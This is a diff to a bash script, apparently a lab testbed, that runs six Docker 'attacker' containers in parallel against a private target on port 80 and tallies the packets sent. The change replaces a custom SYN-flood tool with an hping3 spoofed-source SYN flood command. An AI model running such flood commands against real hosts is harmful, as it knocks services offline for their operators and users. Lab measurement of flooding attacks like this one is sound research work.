@@ -24,7 +24,7 @@ fi
 TARGET="172.30.0.10"
 T_SHORT=6
 T_LONG=16
-SPOOF="--spoof"
+SPOOF="--rand-source"
 SRC_SET=(1 6)   # cac muc so nguon se do
 
 while [[ $# -gt 0 ]]; do
@@ -42,8 +42,8 @@ ATTACKERS=(attacker1 attacker2 attacker3 attacker4 attacker5 attacker6)
 
 # chay 1 attacker trong $2 giay, in ra tong goi (SIGINT de syn_flood in dong "tong goi")
 run_one() { # $1=container $2=dur
-  docker exec "$1" timeout -s INT "$2" python3 /app/syn_flood.py "$TARGET" -p 80 $SPOOF 2>/dev/null \
-    | awk '/tong goi/{print $NF}'
+  docker exec "$1" timeout -s INT "$2" hping3 -S -p 80 -q --flood $SPOOF "$TARGET" 2>&1 \
+    | awk '/transmitted/{print $1}'
 }
 
 # chay $1 attacker song song trong $2 giay, tra ve tong goi cong don
